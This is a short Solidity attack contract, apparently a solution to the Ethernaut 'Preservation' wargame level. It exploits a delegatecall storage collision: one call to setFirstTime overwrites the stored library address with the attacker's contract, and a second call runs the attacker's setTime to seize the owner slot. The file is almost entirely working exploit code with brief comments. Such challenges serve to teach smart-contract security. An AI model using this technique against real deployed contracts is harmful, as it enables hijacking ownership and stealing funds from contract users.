// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Prober {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    Preservation preservation;

    constructor(address $your_ethernaut_address_here) {
        // Ethernaut contract to attack
        preservation = Preservation($your_ethernaut_address_here);
    }

    function attack() public {
        // Put this attack contract in ethernaut storage
        preservation.setFirstTime(uint(uint160(address(this))));
        // Now call again when delegatecall redirects to address(this) and uses our custom setTime() below to update owner
        preservation.setFirstTime(uint(uint160(msg.sender)));
    }

    function setTime(uint _time) public {
        uint time = _time;
        timeZone1Library = address(this);
        timeZone2Library = address(this);
        owner = address(uint160(time));
        storedTime = time;
    }
}